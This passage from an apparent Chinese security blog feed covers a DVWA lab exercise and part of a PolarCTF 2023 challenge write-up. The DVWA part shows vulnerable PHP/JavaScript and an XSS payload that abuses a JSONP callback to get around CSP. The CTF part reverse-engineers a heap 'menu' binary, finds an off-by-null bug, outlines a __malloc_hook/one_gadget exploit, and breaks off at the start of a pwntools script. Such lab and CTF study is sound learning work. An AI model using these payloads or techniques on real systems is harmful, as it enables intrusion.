                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114921730.png"
                      alt="image-20231011114921730"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114940467.png"
                      alt="image-20231011114940467"
                ></p>
<p>直接通过内联 <code>JavaScript</code> 代码，注入时直接令 <code>nonce</code> 为设定好的值即可。</p>
<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// high.php</span><br><span class="line">&lt;?php</span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>源代码的 <code>CSP:</code> <code>&quot;Content-Security-Policy: script-src ‘self’;&quot;</code> 意思是只能从本页面调用 <code>javascript</code> 脚本。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// high.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">solveSum</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;answer&quot;</span>).<span class="property">innerHTML</span> = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="variable language_">document</span>.<span class="property">getElementById</span> (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">clickButton</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>点击网页的按钮使 <code>js</code> 生成一个 <code>script</code> 标签，<code>src</code> 指向 <code>source/jsonp.php?callback=solveNum</code>。<code>appendChild()</code> 方法把 <code>“source/jsonp.php?callback=solveNum”</code> 加入到 DOM 中。 <code>solveNum()</code> 函数传入参数 <code>obj</code>，如果字符串 <code>“answer”</code>  在 <code>obj</code> 中就会执行。<code>getElementById()</code> 方法可返回对拥有指定 <code>ID</code> 的第一个对象的引用，<code>innerHTML</code> 属性设置或返回表格行的开始和结束标签之间的 <code>HTML</code>。这里的 <code>script</code> 标签会把远程加载的 <code>solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</code> 当作 <code>js</code> 代码执行， 然后这个函数就会在页面显示答案。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// josnp.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application/json; charset=UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">	$callback = $_GET[&#x27;callback&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>json.php</code> 中的参数通过 <code>get</code> 方式获取，且没有做过滤。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011155419031.png"
                      alt="image-20231011155419031"
                ></p>
<p>通过 <code>POST</code> 传参将 <code>payload:</code> <code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;</code> 上传即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>PolarCTF2023秋赛:夕阳下的舞者</title>
    <url>/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/</url>
    <content><![CDATA[<h1 id="562-5Liq5Yiw"><a href="#562-5Liq5Yiw" class="headerlink" title="562+5Liq5Yiw"></a>562+5Liq5Yiw</h1><h2 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180215833.png"
                      alt="image-20230911180215833"
                ></p>
<p><code>ELF64</code>位小端序程序，动态链接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180407139.png"
                      alt="image-20230911180407139"
                ></p>
<p>除了<code>FODRTIFY</code>保护，其余保护全开。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./562+5Liq5Yiw</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so ./562+5Liq5Yiw</span><br></pre></td></tr></table></figure></div>

<p>将环境修改为题目的运行环境。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_A9D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Welcome to Chicken farm!!! \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Delete a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Cook a chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Chicken you are so beautiful.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.EXIT.&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_A9D()</code>函数为程序菜单。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_A50</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;==:.........................................................................=..::::..=:::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===-:.......................................................................=..=-:=:.=:.:::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=====-......................................................................=..-:.=:.=:..::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=======:.........................................:..........................=..:--=..=:...:::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;========-:......................................:-=++-......................=..=.:=..=:....::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;==========-....................................:+**###+:....................=-::-----=:......::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===========-...............................:--:.+######=....................=.-:-:-:.=:.......:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:-=========-.............................:+###*:*#+#+*=:...................:=.---:--.=:........::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::-=======-............................:######:####+-......................-::::.::.=:.........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::--=====-...........................:#++####=+####:.......................:--------..........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::--===-...........................#++++++#*-#++##:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::-==-..........................*++++++++#:+++++*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::--..........................+++++++++#++#++++-.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::..........................#++++++++#++#++++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::.........................=+++++++#+++##+++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..:::::::::::::........................*+++++#++++++#++:.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....:::::::::::::.......................#++++#=++++++#*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......:::::::::::::.....................++*##**#++++#=:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........:::::::::::::..................-==++++++*##*=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........:::::::::::::................-======+==+++..............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...........:::::::::::::..............-===+++++++++-.............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.............:::::::::::::...........:===++++++++++=:............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...............:::::::::::::.........===++*+-=***+++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;................::::::::::::::......-=+++*=...-*++++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..................:::::::::::::....-==+++-.....=++++=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....................:::::::::::::..==+++-.......+++++-...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......................::::::::::::-=++*=........:*+++=...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........................::::::::::=+++-..........:+*++-.........................................:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........................::::::::-==+=:...........:+===........................................::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::.......................:::::-==++::::..........====:......................................:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::----===+=::::::::::::::-+==-:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-==++:::::::::::::::-+===::::::::::::::::::::::::::::::::::::-----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-=++-::::::::::::::::+===:::::::::::::::::::::::::::::::::::::----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::=++=:::::::::::::::::====:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::-+++::::::::::::::::::-+++::::::::::::::::::::::::::::::::::::::::-\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::+#+:::::::::::::::::::::*#-::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::##+:::::::::::::::::::::*#*::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::-*###:::::::::::::::::::::###+:::::::::::::::::::::::::::::::::::::::&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="built_in">sub_A9D</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">sub_BFC</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">sub_D28</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_EB3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_1005</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到是一道菜单题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_BFC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">sub_B34</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken nest collapsed!!! \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">1</span>) = <span class="built_in">malloc</span>(*v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">3</span>) = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">2</span>) = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_B74</span>(*((_QWORD *)v2 + <span class="number">1</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="type">void</span> **)v2 + <span class="number">2</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">    dword_203060[v1] = <span class="number">1</span>;</span><br><span class="line">    qword_203080[v1] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BFC()</code>函数创建了一个结构体，并且可以自定义<code>chicken</code>大小。数组<code>qword_203080</code>记录了每一个<code>chicken</code>,数组<code>dword_203060</code>记录了<code>qword_203060</code>的使用情况。可以向<code>mark</code>和<code>name</code>读入内容。并且未将<code>v2+3</code>处的内容初始化，可能存在泄露。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Chicken</span> &#123;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="type">void</span>* name;</span><br><span class="line">	<span class="type">void</span>* mark;</span><br><span class="line">	<span class="type">void</span>* msg; <span class="comment">// 后面分析得知，这里记载的菜名。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>根据读入情况，不难分析出结构体的内容。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B34</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_203060[i] )</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B34()</code>函数用于查看<code>qword_203060</code>数组的使用情况。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">sub_B74</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, a1, a2);</span><br><span class="line">  result = &amp;a1[a2];</span><br><span class="line">  *result &amp;= ~<span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B74()</code>函数置零操作存在<code>off-by-null</code>漏洞。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_D28</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)qword_203080[v1] = <span class="number">0</span>;</span><br><span class="line">    dword_203060[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">8LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">16LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">24LL</span>));</span><br><span class="line">    qword_203080[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken has already been cooked. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_D28()</code>函数用于释放多块，没有问题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_EB3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Old name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me new name.&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>), *(<span class="type">int</span> *)qword_203080[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;New name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me Cook name.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_BC0</span>(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m Ni gun ma i u. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_EB3()</code>函数用于改名字，并记录菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">sub_BC0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[a1] + <span class="number">24LL</span>), <span class="number">0x80</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BC0()</code>函数用于读取菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1005</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The chicken %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    <span class="keyword">if</span> ( dword_203060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Name \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m ErrMsg \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">24LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Mark \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">16LL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_1005()</code>函数用于打印所有信息。这里菜名被标记为<code>ErrMsg</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>sub_BFC()</code>函数未初始化的<code>ErrMsg(菜名)</code>和<code>sub_1005()</code>来进行信息泄露，得到<code>heap</code>和<code>libc</code>地址。然后利用<code>off-by-null</code>漏洞制造堆块重叠，向<code>fastbin</code>中写入<code>__malloc_hook</code>地址，然后篡改其为<code>one_gadget</code>来获取权限。</p>
<h3 id="前置脚本"><a href="#前置脚本" class="headerlink" title="前置脚本"></a>前置脚本</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = 